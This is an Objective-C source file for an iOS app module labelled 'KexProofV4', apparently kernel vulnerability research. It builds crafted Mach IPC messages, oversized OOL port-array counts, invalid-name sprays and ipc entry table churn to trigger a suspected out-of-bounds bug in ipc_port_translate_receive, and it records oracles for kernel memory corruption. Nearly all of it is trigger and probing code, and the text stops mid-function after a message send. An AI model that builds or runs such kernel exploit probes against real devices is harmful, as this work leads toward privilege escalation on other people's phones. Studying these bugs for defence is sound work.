#import "KPAuditIPCModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#import <mach/message.h>
#import <mach_debug/ipc_info.h>

// Per ollie: the OOL backing buffer must pass ipc_kmsg_copyin_ool_ports_descriptor
// in full, otherwise copyin rejects on the first garbage name and the receive-side
// ipc_port_translate_receive path is never reached. Cycle valid send rights or
// MACH_PORT_NULL (legal in OOL arrays) across the whole array.
static void fill_ool_ports_buffer(mach_port_t *buf, uint32_t ool_count,
                                  const mach_port_t *real_ports, uint32_t real_count) {
    for (uint32_t i = 0; i < ool_count; i++) {
        buf[i] = (real_count > 0) ? real_ports[i % real_count] : MACH_PORT_NULL;
    }
}

// Per ollie: churned ports may have lost their send right; MACH_SEND_INVALID_RIGHT
// on a canary ping then looks like a bit-set hit. Guarantee the right first.
static kern_return_t ensure_send_right(mach_port_t port) {
    mach_port_type_t ptype = 0;
    kern_return_t kr = mach_port_type(mach_task_self(), port, &ptype);
    if (kr != KERN_SUCCESS) return kr;
    if ((ptype & MACH_PORT_TYPE_SEND) == 0) {
        if (ptype & MACH_PORT_TYPE_RECEIVE) {
            return mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
        }
        return KERN_INVALID_RIGHT;
    }
    return KERN_SUCCESS;
}

@interface KPAuditIPCModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditIPCModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"ipc112514.translate.armed";
        _title = @"Mach IPC translate-receive (armed)";
        _subtitle = @"index OOB bit-set: send+recv port descriptors + itable churn at growth boundary";
        _icon = @"arrow.left.arrow.right.circle";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-ipc-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[ipc] %@", line];
}

// Send one message with `count` COPY_SEND port descriptors (all referencing the
// same local send right), then RECEIVE it back — the receive is what actually
// runs ipc_port_translate_receive (the vulnerable function).
- (NSDictionary *)sendReceiveCount:(uint32_t)count port:(mach_port_t)port sendRight:(mach_port_t)sendRight {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    // mach_msg_port_descriptor_t is 12 bytes here (name/disposition/type u32
    // triple) — hardcoding a 16-byte stride made the kernel's parser walk
    // misaligned descriptors (MACH_SEND_INVALID_HEADER). Use sizeof.
    size_t descSize = sizeof(mach_msg_port_descriptor_t);
    size_t descBytes = (size_t)count * descSize;
    size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + descBytes;
    result[@"desc_size"] = @(descSize);
    uint8_t *buf = calloc(1, total);
    if (!buf) {
        result[@"status"] = @"CALLOC_FAILED";
        return result;
    }

    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    hdr->msgh_size = (mach_msg_size_t)total;
    hdr->msgh_remote_port = port;
    hdr->msgh_local_port = MACH_PORT_NULL;
    hdr->msgh_id = 0x4b50;

    mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    body->msgh_descriptor_count = count;

    uint8_t *descBase = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
    for (uint32_t i = 0; i < count; i++) {
        mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(descBase + i * descSize);
        pd->name = sendRight;
        pd->disposition = MACH_MSG_TYPE_COPY_SEND;
        pd->type = MACH_MSG_PORT_DESCRIPTOR;
    }

    kern_return_t kr = mach_msg((mach_msg_header_t *)buf,
                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                (mach_msg_size_t)total, 0,
                                MACH_PORT_NULL, 250, MACH_PORT_NULL);
    result[@"send_kr"] = @(kr);
    if (kr != KERN_SUCCESS) {
        free(buf);
        return result;
    }

    // Receive translation path; a descriptor-count mismatch alone is not an OOB oracle.
    size_t rcvTotal = total + 64;
    uint8_t *rcv = calloc(1, rcvTotal);
    mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
    rh->msgh_size = (mach_msg_size_t)rcvTotal;
    rh->msgh_local_port = port;
    kr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)rcvTotal,
                  port, 250, MACH_PORT_NULL);
    result[@"recv_kr"] = @(kr);
    if (kr == KERN_SUCCESS && rh->msgh_size >= sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)) {
        mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
        result[@"recv_desc_count"] = @(rb->msgh_descriptor_count);
        if (rb->msgh_descriptor_count > count) {
            result[@"unexpected_desc_delta"] = @(rb->msgh_descriptor_count - count);
        }
        size_t available = (rh->msgh_size - sizeof(mach_msg_header_t) - sizeof(mach_msg_body_t)) / descSize;
        uint32_t descriptorsToRelease = MIN((size_t)rb->msgh_descriptor_count, available);
        uint8_t *receivedBase = rcv + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
        for (uint32_t i = 0; i < descriptorsToRelease; i++) {
            mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(receivedBase + i * descSize);
            if (pd->type == MACH_MSG_PORT_DESCRIPTOR && pd->name != MACH_PORT_NULL) {
                mach_port_deallocate(mach_task_self(), pd->name);
            }
        }
    }
    free(rcv);
    free(buf);
    return result;
}

// Per ollie: a received MOVE_RECEIVE right installs a NEW name — a NEW
// ipc_entry allocated inside the receive path. That is the window where
// ipc_port_translate_receive can race ipc_entry_grow_table. COPY_SEND of a
// right we already hold only bumps urefs and allocates nothing.
- (NSDictionary *)sendReceiveMoveBurst:(uint32_t)count port:(mach_port_t)port {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    if (count > 64) count = 64;
    mach_port_t aux[64];
    for (uint32_t i = 0; i < count; i++) {
        aux[i] = MACH_PORT_NULL;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &aux[i]);
    }
    size_t descSize = sizeof(mach_msg_port_descriptor_t);
    size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + count * descSize;
    uint8_t *buf = calloc(1, total);
    if (!buf) {
        result[@"status"] = @"CALLOC_FAILED";
        return result;
    }
    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    hdr->msgh_size = (mach_msg_size_t)total;
    hdr->msgh_remote_port = port;
    hdr->msgh_local_port = MACH_PORT_NULL;
    hdr->msgh_id = 0x4b51;
    mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    body->msgh_descriptor_count = count;
    uint8_t *descBase = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
    for (uint32_t i = 0; i < count; i++) {
        mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(descBase + i * descSize);
        pd->name = aux[i];
        pd->disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
        pd->type = MACH_MSG_PORT_DESCRIPTOR;
    }
    kern_return_t kr = mach_msg((mach_msg_header_t *)buf,
                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                (mach_msg_size_t)total, 0,
                                MACH_PORT_NULL, 250, MACH_PORT_NULL);
    result[@"send_kr"] = @(kr);
    free(buf);
    if (kr != KERN_SUCCESS) {
        for (uint32_t i = 0; i < count; i++) {
            if (aux[i] != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), aux[i]);
        }
        return result;
    }
    // In-flight oracle (ollie): between send and receive the RECEIVE right sits
    // in imq_messages — mach_port_type must show the RECEIVE bit GONE from our
    // is_table entry. After receive the bit comes back, so post-recv checks
    // always read 0 mutations. Measure HERE.
    uint32_t inFlight = 0;
    for (uint32_t i = 0; i < count; i++) {
        if (aux[i] == MACH_PORT_NULL) continue;
        mach_port_type_t pt = 0;
        kern_return_t tk = mach_port_type(mach_task_self(), aux[i], &pt);
        if (tk != KERN_SUCCESS || (pt & MACH_PORT_TYPE_RECEIVE) == 0) inFlight++;
    }
    result[@"inflight_recv_bit_cleared"] = @(inFlight);
    size_t rcvTotal = total + 64;
    uint8_t *rcv = calloc(1, rcvTotal);
    mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
    rh->msgh_size = (mach_msg_size_t)rcvTotal;
    rh->msgh_local_port = port;
    kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)rcvTotal,
                                 port, 250, MACH_PORT_NULL);
    result[@"recv_kr"] = @(rkr);
    if (rkr == KERN_SUCCESS && rh->msgh_size >= sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)) {
        mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
        result[@"recv_desc_count"] = @(rb->msgh_descriptor_count);
        size_t available = (rh->msgh_size - sizeof(mach_msg_header_t) - sizeof(mach_msg_body_t)) / descSize;
        uint32_t toRelease = MIN((size_t)rb->msgh_descriptor_count, available);
        uint8_t *recvBase = rcv + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
        for (uint32_t i = 0; i < toRelease; i++) {
            mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(recvBase + i * descSize);
            if (pd->name != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), pd->name);
        }
    }
    free(rcv);
    return result;
}

// Churn the ipc entry table around the changed growth/free path.
// This creates lifecycle pressure only; it does not localize or prove a bug.
- (void)churnItableWithPorts:(NSMutableArray *)held count:(int)count {
    for (int i = 0; i < count; i++) {
        mach_port_t p = MACH_PORT_NULL;
        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
        if (kr == KERN_SUCCESS) {
            [held addObject:@(p)];
            if (held.count > 4096) {
                mach_port_t old = (mach_port_t)[held.firstObject unsignedIntValue];
                [held removeObjectAtIndex:0];
                mach_port_destroy(mach_task_self(), old);
            }
        }
    }
}

#pragma mark - ipc_entry_grow_table boundary diagnostics

- (NSDictionary *)portSpaceBasicSnapshot {
    ipc_info_space_basic_t info = {0};
    kern_return_t kr = mach_port_space_basic_info(mach_task_self(), &info);
    return @{
        @"kr": @(kr), @"table_size": @(info.iisb_table_size),
        @"table_inuse": @(info.iisb_table_inuse),
    };
}

- (NSDictionary *)runIPCEntryGrowthDiagnosticAtPort:(mach_port_t)port sendRight:(mach_port_t)sendRight {
    NSDictionary *initial = [self portSpaceBasicSnapshot];
    if ([initial[@"kr"] intValue] != KERN_SUCCESS) {
        return @{@"status": @"SPACE_INFO_FAILED", @"initial": initial};
    }
    uint32_t initialSize = [initial[@"table_size"] unsignedIntValue];
    if (initialSize < 2 || initialSize > 1024) {
        return @{@"status": @"BASELINE_OUTSIDE_BOUNDED_RANGE", @"initial": initial};
    }

    // Per ollie: is_table grows monotonically (170->256->341->512) and never
    // shrinks, so adjacent points of a crossed boundary cannot be re-probed in
    // one ipc_space. Each round targets the CURRENT table_size fill point and
    // records growth wherever it occurs (allocate loop OR send/recv insert).
    NSMutableArray *rounds = [NSMutableArray array];
    for (size_t round = 0; round < 6; round++) {
        NSDictionary *before = [self portSpaceBasicSnapshot];
        if ([before[@"kr"] intValue] != KERN_SUCCESS) {
            [rounds addObject:@{@"round": @(round), @"before": before,
                                @"status": @"INFO_FAILED"}];
            break;
        }
        uint32_t beforeInUse = [before[@"table_inuse"] unsignedIntValue];
        uint32_t currentSize = [before[@"table_size"] unsignedIntValue];
        // Per ollie: fill to boundary-1 so the RECEIVE inserts cross the edge
        // and ipc_entry_grow_table fires inside mach_msg_receive.
        uint32_t target = (currentSize > 1) ? currentSize - 1 : currentSize;
        if (target <= beforeInUse) {
            [rounds addObject:@{@"round": @(round), @"target_inuse": @(target), @"before": before,
                                @"status": @"TARGET_BELOW_BASELINE_OR_INFO_FAILED"}];
            break;
        }

        NSMutableArray *allocated = [NSMutableArray array];
        uint32_t allocationFailures = 0;
        kern_return_t lastAllocationKR = KERN_SUCCESS;
        while (beforeInUse + allocated.count < target && allocated.count < 2048) {
            mach_port_t name = MACH_PORT_NULL;
            lastAllocationKR = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &name);
            if (lastAllocationKR != KERN_SUCCESS) {
                allocationFailures++;
                break;
            }
            [allocated addObject:@(name)];
        }

        NSDictionary *afterAllocation = [self portSpaceBasicSnapshot];
        // MOVE_RECEIVE burst: each received right allocates a NEW ipc_entry in
        // the receive path (COPY_SEND would only bump urefs — ollie).
        NSDictionary *message = [self sendReceiveMoveBurst:4 port:port];
        uint32_t destroyFailures = 0;
        for (NSNumber *name in allocated) {
            kern_return_t dkr = mach_port_destroy(mach_task_self(), (mach_port_t)name.unsignedIntValue);
            if (dkr != KERN_SUCCESS) destroyFailures++;
        }
        NSDictionary *afterFree = [self portSpaceBasicSnapshot];
        uint32_t sizeBefore = [before[@"table_size"] unsignedIntValue];
        uint32_t sizeAlloc = [afterAllocation[@"table_size"] unsignedIntValue];
        uint32_t sizeFree = [afterFree[@"table_size"] unsignedIntValue];
        BOOL grewAlloc = sizeAlloc > sizeBefore;
        BOOL grewDuringSendRecv = sizeFree > sizeAlloc;
        [rounds addObject:@{
            @"round": @(round), @"target_inuse": @(target), @"boundary": @(currentSize),
            @"before": before,
            @"allocated": @(allocated.count), @"last_allocate_kr": @(lastAllocationKR),
            @"allocate_failures": @(allocationFailures),
            @"after_allocate": afterAllocation,
            @"table_grew": @(grewAlloc || grewDuringSendRecv),
            @"grew_during_sendrecv": @(grewDuringSendRecv),
            @"send_kr": message[@"send_kr"] ?: @(-1),
            @"recv_kr": message[@"recv_kr"] ?: @(-1),
            @"recv_desc_count": message[@"recv_desc_count"] ?: @0,
            @"inflight_recv_bit_cleared": message[@"inflight_recv_bit_cleared"] ?: @0,
            @"destroy_failures": @(destroyFailures), @"after_free": afterFree,
            @"inuse_restored": @([afterFree[@"table_inuse"] unsignedIntValue] == beforeInUse),
        }];
        if (!grewAlloc && !grewDuringSendRecv) {
            break; // boundary not crossed this way; later rounds would repeat it
        }
    }
    return @{
        @"shape": @"ipc_entry_grow_table allocate/free + one-descriptor send/receive (per live boundary)",
        @"initial": initial, @"rounds": rounds,
        @"oracle": @"table size/inuse and kr values only; accepted messages do not prove OOB or UAF",
        @"note": @"is_table never shrinks; send/recv itself allocates a slot and can cross the boundary before after_free (ollie)",
    };
}

#pragma mark - Diagnostics: which message shape is rejected

- (NSDictionary *)sendShape:(NSString *)shape
                  complexBit:(BOOL)complex
              descriptorCount:(uint32_t)count
                    msghID:(int32_t)msgID
                        port:(mach_port_t)port
                  sendRight:(mach_port_t)sendRight {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    size_t descSize = sizeof(mach_msg_port_descriptor_t);
    size_t descBytes = complex ? (size_t)count * descSize : 0;
    size_t total = sizeof(mach_msg_header_t) + (complex ? sizeof(mach_msg_body_t) : 0) + descBytes;
    uint8_t *buf = calloc(1, total);
    if (!buf) {
        result[@"status"] = @"CALLOC_FAILED";
        return result;
    }
    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | (complex ? MACH_MSGH_BITS_COMPLEX : 0);
    hdr->msgh_size = (mach_msg_size_t)total;
    hdr->msgh_remote_port = port;
    hdr->msgh_local_port = MACH_PORT_NULL;
    hdr->msgh_id = msgID;
    if (complex) {
        mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
        body->msgh_descriptor_count = count;
        uint8_t *descBase = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
        for (uint32_t i = 0; i < count; i++) {
            mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(descBase + i * descSize);
            pd->name = sendRight;
            pd->disposition = MACH_MSG_TYPE_COPY_SEND;
            pd->type = MACH_MSG_PORT_DESCRIPTOR;
        }
    }
    kern_return_t kr = mach_msg((mach_msg_header_t *)buf,
                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                (mach_msg_size_t)total, 0,
                                MACH_PORT_NULL, 250, MACH_PORT_NULL);
    result[@"shape"] = shape;
    result[@"size"] = @(total);
    result[@"desc_size"] = @(descSize);
    result[@"send_kr"] = @(kr);
    free(buf);
    // Drain our own message: the port queue limit is ~5 — without a receive,
    // the matrix fills the queue and every later send blocks (the "hang").
    if (kr == KERN_SUCCESS) {
        size_t rcvTotal = total + 64;
        uint8_t *rcv = calloc(1, rcvTotal);
        mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
        rh->msgh_size = (mach_msg_size_t)rcvTotal;
        rh->msgh_local_port = port;
        kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                     0, (mach_msg_size_t)rcvTotal,
                                     port, 250, MACH_PORT_NULL);
        result[@"recv_kr"] = @(rkr);
        free(rcv);
    }
    return result;
}

#pragma mark - OOL ports array: crafted count (the ool_port_array lane)

// mach_msg_ool_ports_descriptor_t carries an ARRAY of ports + a count field.
// This lane varies valid versus deliberately invalid entries and records the
// validation boundary. The allocation always covers `count`; no userspace OOB
// read or kernel OOB transfer is inferred from an accepted message.
- (NSDictionary *)sendOOLPortsCount:(uint32_t)count realEntries:(uint32_t)real port:(mach_port_t)port sendRight:(mach_port_t)sendRight {
    // Default path: fully valid buffer (ollie). useSpray:YES is only the
    // deliberately-invalid-name control used by the labeled threshold probe.
    return [self sendOOLPortsCount:count realEntries:real port:port sendRight:sendRight useSpray:NO];
}

- (NSDictionary *)sendOOLPortsCount:(uint32_t)count realEntries:(uint32_t)real port:(mach_port_t)port sendRight:(mach_port_t)sendRight useSpray:(BOOL)useSpray {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    size_t oolSize = sizeof(mach_msg_ool_ports_descriptor_t);
    size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + oolSize;

    // Allocate enough entries to cover both `real` and `count` (plus padding),
    // so the kernel's copyin never reads past our buffer.
    // Allocate enough entries to cover max sweep count (4096) plus padding
    uint32_t allocEntries = 4096 + 32;
    mach_port_t *ports = calloc(allocEntries, sizeof(mach_port_t));
    if (useSpray) {
        // Deliberate invalid-name control: first `real` entries valid, tail garbage.
        // Measures where ipc_kmsg_copyin_ool_ports_descriptor rejects names — NOT a count limit.
        for (uint32_t i = 0; i < allocEntries; i++) {
            ports[i] = (i < real) ? sendRight : (mach_port_t)(0xdeadbee0 + i);
        }
    } else {
        // Clean fill (ollie): every entry passes copyin so crafted counts reach translate_receive.
        fill_ool_ports_buffer(ports, allocEntries, &sendRight, 1);
    }

    uint8_t *buf = calloc(1, total);
    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    hdr->msgh_size = (mach_msg_size_t)total;
    hdr->msgh_remote_port = port;
    hdr->msgh_local_port = MACH_PORT_NULL;
    hdr->msgh_id = 2;
    mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    body->msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *od =
        (mach_msg_ool_ports_descriptor_t *)(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
    od->address = ports;
    od->count = count;          // THE crafted value
    od->disposition = MACH_MSG_TYPE_COPY_SEND;
    od->deallocate = 0;
    od->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    kern_return_t kr = mach_msg((mach_msg_header_t *)buf,
                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                (mach_msg_size_t)total, 0,
                                MACH_PORT_NULL, 250, MACH_PORT_NULL);
    result[@"ool_count"] = @(count);
    result[@"real"] = @(real);
    result[@"send_kr"] = @(kr);
    if (kr == KERN_SUCCESS) {
        size_t rcvTotal = total + 512;
        uint8_t *rcv = calloc(1, rcvTotal);
        mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
        rh->msgh_size = (mach_msg_size_t)rcvTotal;
        rh->msgh_local_port = port;
        kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                     0, (mach_msg_size_t)rcvTotal,
                                     port, 250, MACH_PORT_NULL);
        result[@"recv_kr"] = @(rkr);

        // Minimal parse: just read the descriptor count from the body
        if (rkr == KERN_SUCCESS && rcvTotal >= sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)) {
            mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
            result[@"recv_desc_count"] = @(rb->msgh_descriptor_count);
        }
        free(rcv);
    }
    free(buf);
    free(ports);
    return result;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · IPC translate_receive index OOB ===\n"];
    [report appendString:@"Fix-diff hypothesis: 27.2 changes bounds handling in the 16-byte-stride\n"];
    [report appendString:@"ipc_port_translate_receive table walk and in ipc_entry_grow_table.\n"];
    [report appendString:@"Candidate mechanism under test: table[index] access and bit-set attribution.\n"];
    [report appendString:@"translate_receive runs at RECEIVE time, so the probe sends AND receives.\n"];
    [report appendString:@"The measured growth matrix records table_size/table_inuse at each boundary.\n"];
    [report appendString:@"A crash address alone is not proof; index control and table base require independent evidence.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    mach_port_t port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    [report appendFormat:@"port allocate kr=%d port=%u\n", kr, port];
    if (kr != KERN_SUCCESS) {
        [report appendString:@"\nVERDICT: PORT_ALLOCATE_FAILED\n"];
        return report;
    }
    kern_return_t insertKR = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    [report appendFormat:@"send-right insert kr=%d\n", insertKR];
    if (insertKR != KERN_SUCCESS) {
        mach_port_destroy(mach_task_self(), port);
        [report appendString:@"\nVERDICT: SEND_RIGHT_INSERT_FAILED\n"];
        return report;
    }

    NSDictionary *growth = [self runIPCEntryGrowthDiagnosticAtPort:port sendRight:port];
    [report appendString:@"\n--- ipc_entry_grow_table measured boundary matrix ---\n"];
    [report appendFormat:@"%@\n", growth];
    [self journal:[NSString stringWithFormat:@"GROWTH_MATRIX %@", growth]];

    NSMutableArray *held = [NSMutableArray array];
    [self churnItableWithPorts:held count:512];
    [self journal:[NSString stringWithFormat:@"CHURN_BASE held=%d", (int)held.count]];

    [report appendString:@"\n--- diagnostic matrix (why does send fail?) ---\n"];
    // 0x10000408 on every send: either descriptor layout or iOS mach message
    // filtering (MACH_SEND_MSG_FILTERED). The matrix isolates the cause.
    NSDictionary *d1 = [self sendShape:@"simple" complexBit:NO descriptorCount:0 msghID:0 port:port sendRight:port];
    [report appendFormat:@"%@\n", d1];
    NSDictionary *d2 = [self sendShape:@"complex0-id0" complexBit:YES descriptorCount:0 msghID:0 port:port sendRight:port];
    [report appendFormat:@"%@\n", d2];
    NSDictionary *d3 = [self sendShape:@"complex1-id0" complexBit:YES descriptorCount:1 msghID:0 port:port sendRight:port];
    [report appendFormat:@"%@\n", d3];
    NSDictionary *d4 = [self sendShape:@"complex1-id4b50" complexBit:YES descriptorCount:1 msghID:0x4b50 port:port sendRight:port];
    [report appendFormat:@"%@\n", d4];
    NSDictionary *d5 = [self sendShape:@"complex1-id1" complexBit:YES descriptorCount:1 msghID:1 port:port sendRight:port];
    [report appendFormat:@"%@\n", d5];

    [report appendString:@"\n--- descriptor-count sweep (send+recv) ---\n"];
    uint32_t counts[] = {1, 2, 4, 8, 16, 32, 64, 128};
    for (size_t i = 0; i < sizeof(counts)/sizeof(counts[0]); i++) {
        NSDictionary *r = [self sendReceiveCount:counts[i] port:port sendRight:port];
        [report appendFormat:@"count=%u -> %@\n", counts[i], r];
        [self journal:[NSString stringWithFormat:@"sweep count=%u %@", counts[i], r]];
    }

    [report appendString:@"\n--- OOL ports array: validation matrix ---\n"];
    // The first 64 entries are valid send rights; later entries are deliberately
    // invalid names inside the same fully allocated backing buffer.
    uint32_t oolCounts[] = {1, 4, 16, 64, 65, 128, 256, 1024, 4096};
    for (size_t i = 0; i < sizeof(oolCounts)/sizeof(oolCounts[0]); i++) {
        NSDictionary *r = [self sendOOLPortsCount:oolCounts[i] realEntries:64 port:port sendRight:port];
        [report appendFormat:@"%@\n", r];
        [self journal:[NSString stringWithFormat:@"ool count=%u kr=%@/%@",
                       oolCounts[i], r[@"send_kr"], r[@"recv_kr"]]];
    }

    [report appendString:@"\n--- OOL validation threshold (64..96 valid/invalid entries) ---\n"];
    uint32_t lastOK = 0, threshold = 0, acceptedOversized = 0;
    for (uint32_t c = 64; c <= 96; c++) {
        // useSpray:YES on purpose — invalid-name control (copyin name validation),
        // not a count clamp. The count sweep above now uses the clean fill.
        NSDictionary *r = [self sendOOLPortsCount:c realEntries:64 port:port sendRight:port useSpray:YES];
        [report appendFormat:@"%@\n", r];
        [self journal:[NSString stringWithFormat:@"ool_sweep count=%u send_kr=%@ recv_kr=%@ recv_desc_count=%@",
                       c, r[@"send_kr"], r[@"recv_kr"], r[@"recv_desc_count"]]];
        if ([r[@"send_kr"] intValue] == 0) {
            lastOK = c;
            if (c > 64 && [r[@"recv_kr"] intValue] == 0) acceptedOversized++;
        } else if (threshold == 0) {
            threshold = c;
        }
        usleep(2000);
    }
    [report appendFormat:@"\nthreshold analysis: last_ok=%u first_rejection=%u delta=%u accepted_oversized=%u\n",
     lastOK, threshold, threshold > 64 ? threshold - 64 : 0, acceptedOversized];
    if (acceptedOversized > 0) {
        [report appendString:@"Some counts with invalid entries were accepted; this is a validation observation only.\n"];
        [report appendString:@"The backing allocation covers every count, so no OOB transfer is demonstrated.\n"];
    } else if (threshold > 0) {
        [report appendFormat:@"First rejected count: %u; inspect send_kr/recv_kr rather than inferring a clamp.\n", threshold];
    }

    // --- precise ie_bits oracle (mach_port_type + mach_port_get_refs) ---
    // Per ollie: mach_msg_send is blind to OR-mutations of ie_bits.
    // Use mach_port_type() + mach_port_get_refs() for exact bit/urefs comparison.
    // Also use MACH_MSG_TYPE_MOVE_RECEIVE to trigger ipc_port_translate_receive.
    [report appendString:@"\n--- precise ie_bits oracle (MOVE_RECEIVE) ---\n"];

    #define PRECISE_N 64
    mach_port_t pcanary[PRECISE_N];
    mach_port_type_t ptype_before[PRECISE_N];
    mach_port_urefs_t prefs_before[PRECISE_N];

    for (int i = 0; i < PRECISE_N; i++) {
        pcanary[i] = MACH_PORT_NULL;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &pcanary[i]);
        mach_port_insert_right(mach_task_self(), pcanary[i], pcanary[i], MACH_MSG_TYPE_MAKE_SEND);
        mach_port_type(mach_task_self(), pcanary[i], &ptype_before[i]);
        mach_port_get_refs(mach_task_self(), pcanary[i], MACH_PORT_RIGHT_SEND, &prefs_before[i]);
    }

    // Send message with MOVE_RECEIVE descriptor to trigger ipc_port_translate_receive
    #pragma pack(push, 4)
    struct {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_port_descriptor_t desc[2];
    } moveMsg;
    #pragma pack(pop)

    mach_port_t moveRx = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &moveRx);
    mach_port_insert_right(mach_task_self(), moveRx, moveRx, MACH_MSG_TYPE_MAKE_SEND);

    mach_port_t auxSend = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &auxSend);
    mach_port_insert_right(mach_task_self(), auxSend, auxSend, MACH_MSG_TYPE_MAKE_SEND);

    memset(&moveMsg, 0, sizeof(moveMsg));
    moveMsg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    moveMsg.hdr.msgh_size = sizeof(moveMsg);
    moveMsg.hdr.msgh_remote_port = port;
    moveMsg.hdr.msgh_id = 0x112514;
    moveMsg.body.msgh_descriptor_count = 2;
    moveMsg.desc[0].name = auxSend;
    moveMsg.desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;
    moveMsg.desc[0].type = MACH_MSG_PORT_DESCRIPTOR;
    moveMsg.desc[1].name = moveRx;
    moveMsg.desc[1].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    moveMsg.desc[1].type = MACH_MSG_PORT_DESCRIPTOR;

    kern_return_t moveSend = mach_msg(&moveMsg.hdr, MACH_SEND_MSG, sizeof(moveMsg), 0,
                                       MACH_PORT_NULL, 0, MACH_PORT_NULL);
